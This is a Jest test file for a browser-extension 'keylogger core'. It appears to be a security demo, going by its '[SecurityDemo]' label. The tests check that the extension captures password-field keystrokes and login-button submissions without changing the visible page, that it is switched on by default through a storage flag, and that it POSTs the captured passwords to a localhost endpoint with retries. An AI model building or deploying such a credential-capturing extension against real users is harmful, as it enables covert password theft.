/**
 * Unit tests for keylogger core (Task 2.1 / 2.3) and storage state (Task 2.2)
 * Requirements: 2.3, 2.4, 3.1, 3.2, 9.4, 9.5
 */

import {
  attachListeners,
  detachListeners,
  onStorageChange,
  setSendCapture,
  resetSendCapture,
  CaptureEvent,
} from "./content";

// Helper: set up a minimal DOM with a password field and a submit button
function setupLoginDOM(buttonText = "Đăng nhập"): {
  passwordInput: HTMLInputElement;
  submitButton: HTMLButtonElement;
} {
  document.body.innerHTML = `
    <input type="text" id="username" />
    <input type="password" id="password" />
    <button id="submit">${buttonText}</button>
  `;
  return {
    passwordInput: document.getElementById("password") as HTMLInputElement,
    submitButton: document.getElementById("submit") as HTMLButtonElement,
  };
}

// Helper: set up DOM WITHOUT a password field
function setupNonLoginDOM(): void {
  document.body.innerHTML = `<input type="text" id="username" />`;
}

// Helper: fire a keyup event on an element
function fireKeyup(el: HTMLElement): void {
  el.dispatchEvent(new Event("keyup", { bubbles: true }));
}

// Helper: fire a click event on an element
function fireClick(el: HTMLElement): void {
  el.dispatchEvent(new Event("click", { bubbles: true }));
}

describe("attachListeners / detachListeners", () => {
  let captured: CaptureEvent[];

  beforeEach(() => {
    captured = [];
    setSendCapture(async (e) => { captured.push(e); });
    detachListeners();
  });

  afterEach(() => {
    resetSendCapture();
    detachListeners();
    document.body.innerHTML = "";
  });

  // ── Requirement 2.4 ──────────────────────────────────────────────────────
  test("does NOT attach listeners when no password field exists", () => {
    setupNonLoginDOM();
    attachListeners();
    const textInput = document.getElementById("username") as HTMLInputElement;
    fireKeyup(textInput);
    expect(captured).toHaveLength(0);
  });

  // ── Requirement 3.1 ──────────────────────────────────────────────────────
  test("captures keypress event with correct structure", () => {
    const { passwordInput } = setupLoginDOM();
    attachListeners();

    passwordInput.value = "abc";
    fireKeyup(passwordInput);

    expect(captured).toHaveLength(1);
    const event = captured[0];
    expect(event.type).toBe("keypress");
    expect(event.value).toBe("abc");
    expect(event.url).toBe(window.location.href);
    // ISO 8601 check
    expect(new Date(event.timestamp).toISOString()).toBe(event.timestamp);
  });

  test("captures each keypress separately", () => {
    const { passwordInput } = setupLoginDOM();
    attachListeners();

    passwordInput.value = "a";
    fireKeyup(passwordInput);
    passwordInput.value = "ab";
    fireKeyup(passwordInput);

    expect(captured).toHaveLength(2);
    expect(captured[0].value).toBe("a");
    expect(captured[1].value).toBe("ab");
  });

  // ── Requirement 3.2 ──────────────────────────────────────────────────────
  test('captures submit event when button text is "Đăng nhập"', () => {
    const { passwordInput, submitButton } = setupLoginDOM("Đăng nhập");
    attachListeners();

    passwordInput.value = "secret";
    fireClick(submitButton);

    expect(captured).toHaveLength(1);
    const event = captured[0];
    expect(event.type).toBe("submit");
    expect(event.value).toBe("secret");
    expect(event.url).toBe(window.location.href);
    expect(new Date(event.timestamp).toISOString()).toBe(event.timestamp);
  });

  test('captures submit event when button text is "Login"', () => {
    const { passwordInput, submitButton } = setupLoginDOM("Login");
    attachListeners();

    passwordInput.value = "pass123";
    fireClick(submitButton);

    expect(captured).toHaveLength(1);
    expect(captured[0].type).toBe("submit");
    expect(captured[0].value).toBe("pass123");
  });

  test('captures submit event when button text is "Submit"', () => {
    const { passwordInput, submitButton } = setupLoginDOM("Submit");
    attachListeners();

    passwordInput.value = "mypassword";
    fireClick(submitButton);

    expect(captured).toHaveLength(1);
    expect(captured[0].type).toBe("submit");
  });

  test("does NOT capture click on non-submit button", () => {
    setupLoginDOM();
    document.body.innerHTML += `<button id="other">Cancel</button>`;
    attachListeners();

    const otherBtn = document.getElementById("other") as HTMLButtonElement;
    fireClick(otherBtn);

    expect(captured).toHaveLength(0);
  });

  // ── Requirement 2.3 (no UI modifications) ────────────────────────────────
  test("does not add any visible DOM elements to the page", () => {
    setupLoginDOM();
    const beforeAttach = document.body.innerHTML;
    attachListeners();
    expect(document.body.innerHTML).toBe(beforeAttach);
  });

  // ── detachListeners ───────────────────────────────────────────────────────
  test("stops capturing after detachListeners is called", () => {
    const { passwordInput } = setupLoginDOM();
    attachListeners();
    detachListeners();

    passwordInput.value = "xyz";
    fireKeyup(passwordInput);

    expect(captured).toHaveLength(0);
  });
});

// ── Task 2.2: Active/Inactive state via chrome.storage ───────────────────────
// Requirements: 9.4, 9.5

describe("onStorageChange", () => {
  let captured: CaptureEvent[];

  beforeEach(() => {
    captured = [];
    setSendCapture(async (e) => { captured.push(e); });
    // Start detached so each test controls state explicitly
    detachListeners();
    document.body.innerHTML = `
      <input type="password" id="password" />
      <button id="submit">Login</button>
    `;
  });

  afterEach(() => {
    resetSendCapture();
    detachListeners();
    document.body.innerHTML = "";
  });

  // ── Requirement 9.4 / 9.5 ────────────────────────────────────────────────

  test("toggle from inactive to active: attachListeners is called and captures events", () => {
    // Start inactive
    onStorageChange({ active: { newValue: false, oldValue: true } });

    // Verify no capture while inactive
    const pw = document.getElementById("password") as HTMLInputElement;
    pw.value = "test";
    pw.dispatchEvent(new Event("keyup", { bubbles: true }));
    expect(captured).toHaveLength(0);

    // Toggle to active
    onStorageChange({ active: { newValue: true, oldValue: false } });

    // Now events should be captured
    pw.value = "hello";
    pw.dispatchEvent(new Event("keyup", { bubbles: true }));
    expect(captured).toHaveLength(1);
    expect(captured[0].value).toBe("hello");
  });

  test("toggle from active to inactive: detachListeners is called, no data sent", () => {
    // Start active
    onStorageChange({ active: { newValue: true, oldValue: false } });

    const pw = document.getElementById("password") as HTMLInputElement;
    pw.value = "before";
    pw.dispatchEvent(new Event("keyup", { bubbles: true }));
    expect(captured).toHaveLength(1);

    // Toggle to inactive
    onStorageChange({ active: { newValue: false, oldValue: true } });

    // No more captures after going inactive
    pw.value = "after";
    pw.dispatchEvent(new Event("keyup", { bubbles: true }));
    expect(captured).toHaveLength(1); // still 1, no new events
  });

  test("unrelated storage key change does not affect listener state", () => {
    onStorageChange({ active: { newValue: true, oldValue: false } });

    const pw = document.getElementById("password") as HTMLInputElement;
    pw.value = "x";
    pw.dispatchEvent(new Event("keyup", { bubbles: true }));
    expect(captured).toHaveLength(1);

    // Change an unrelated key — should not detach
    onStorageChange({ someOtherKey: { newValue: "foo", oldValue: "bar" } });

    pw.value = "y";
    pw.dispatchEvent(new Event("keyup", { bubbles: true }));
    expect(captured).toHaveLength(2);
  });
});

// ── Task 2.2: Startup state reading from chrome.storage ──────────────────────
// Requirements: 9.4, 9.5

describe("startup state from chrome.storage.local", () => {
  let captured: CaptureEvent[];
  let originalChrome: typeof chrome;

  beforeEach(() => {
    captured = [];
    setSendCapture(async (e) => { captured.push(e); });
    detachListeners();
    document.body.innerHTML = `
      <input type="password" id="password" />
      <button id="submit">Login</button>
    `;
    // Save original chrome global (undefined in jsdom)
    originalChrome = (globalThis as any).chrome;
  });

  afterEach(() => {
    resetSendCapture();
    detachListeners();
    document.body.innerHTML = "";
    // Restore chrome global
    (globalThis as any).chrome = originalChrome;
  });

  function simulateStartup(activeValue: boolean | undefined): void {
    // Mock chrome.storage.local.get to call back synchronously
    (globalThis as any).chrome = {
      storage: {
        local: {
          get: (_key: string, callback: (result: Record<string, unknown>) => void) => {
            const result: Record<string, unknown> = {};
            if (activeValue !== undefined) result["active"] = activeValue;
            callback(result);
          },
        },
        onChanged: {
          addListener: jest.fn(),
        },
      },
    };

    // Re-run the bootstrap logic inline (mirrors content.ts bootstrap block)
    const chromeGlobal = (globalThis as any).chrome;
    chromeGlobal.storage.local.get("active", (result: Record<string, unknown>) => {
      const active = result["active"] !== false; // default true
      if (active) attachListeners();
    });
  }

  test("startup with active=true: listeners are attached and capture events", () => {
    simulateStartup(true);

    const pw = document.getElementById("password") as HTMLInputElement;
    pw.value = "abc";
    pw.dispatchEvent(new Event("keyup", { bubbles: true }));

    expect(captured).toHaveLength(1);
    expect(captured[0].value).toBe("abc");
  });

  test("startup with active=false: listeners are NOT attached, no events captured", () => {
    simulateStartup(false);

    const pw = document.getElementById("password") as HTMLInputElement;
    pw.value = "abc";
    pw.dispatchEvent(new Event("keyup", { bubbles: true }));

    expect(captured).toHaveLength(0);
  });

  test("startup with no stored value (undefined): defaults to active, captures events", () => {
    simulateStartup(undefined);

    const pw = document.getElementById("password") as HTMLInputElement;
    pw.value = "default";
    pw.dispatchEvent(new Event("keyup", { bubbles: true }));

    expect(captured).toHaveLength(1);
    expect(captured[0].value).toBe("default");
  });
});

// ── Task 3.1 / 3.2: sendCapture — HTTP POST, retry, fallback ─────────────────
// Requirements: 4.1, 4.2, 4.5

import { sendCapture } from "./content";

describe("sendCapture", () => {
  const sampleEvent: CaptureEvent = {
    timestamp: new Date().toISOString(),
    url: "http://localhost/demo",
    type: "keypress",
    value: "abc",
  };

  let consoleSpy: jest.SpyInstance;

  beforeEach(() => {
    consoleSpy = jest.spyOn(console, "log").mockImplementation(() => {});
  });

  afterEach(() => {
    jest.restoreAllMocks();
    (globalThis as any).fetch = undefined;
  });

  // ── Requirement 4.1 / 4.2 ────────────────────────────────────────────────
  test("sends HTTP POST to http://localhost:3000/capture with correct JSON body", async () => {
    const mockFetch = jest.fn().mockResolvedValue({ ok: true });
    (globalThis as any).fetch = mockFetch;

    await sendCapture(sampleEvent);

    expect(mockFetch).toHaveBeenCalledTimes(1);
    const [url, options] = mockFetch.mock.calls[0];
    expect(url).toBe("http://localhost:3000/capture");
    expect(options.method).toBe("POST");
    expect(options.headers).toMatchObject({ "Content-Type": "application/json" });

    const body = JSON.parse(options.body);
    expect(body).toEqual({
      timestamp: sampleEvent.timestamp,
      url: sampleEvent.url,
      type: sampleEvent.type,
      value: sampleEvent.value,
    });
  });

  // ── Requirement 4.5 ──────────────────────────────────────────────────────
  test("retries exactly 2 times after initial failure (3 total attempts) then falls back to console.log", async () => {
    const mockFetch = jest.fn().mockRejectedValue(new Error("Network error"));
    (globalThis as any).fetch = mockFetch;

    await sendCapture(sampleEvent);

    expect(mockFetch).toHaveBeenCalledTimes(3);
    expect(consoleSpy).toHaveBeenCalledWith("[SecurityDemo] capture:", sampleEvent);
  });

  test("does NOT fall back to console.log when first attempt succeeds", async () => {
    const mockFetch = jest.fn().mockResolvedValue({ ok: true });
    (globalThis as any).fetch = mockFetch;

    await sendCapture(sampleEvent);

    expect(consoleSpy).not.toHaveBeenCalled();
  });

  test("succeeds on second attempt (1 failure then success) — no fallback", async () => {
    const mockFetch = jest
      .fn()
      .mockRejectedValueOnce(new Error("fail"))
      .mockResolvedValue({ ok: true });
    (globalThis as any).fetch = mockFetch;

    await sendCapture(sampleEvent);

    expect(mockFetch).toHaveBeenCalledTimes(2);
    expect(consoleSpy).not.toHaveBeenCalled();
  });

  test("treats non-2xx response as failure and retries", async () => {
    const mockFetch = jest.fn().mockResolvedValue({ ok: false, status: 500 });
    (globalThis as any).fetch = mockFetch;

    await sendCapture(sampleEvent);

    expect(mockFetch).toHaveBeenCalledTimes(3);
    expect(consoleSpy).toHaveBeenCalledWith("[SecurityDemo] capture:", sampleEvent);
  });
});
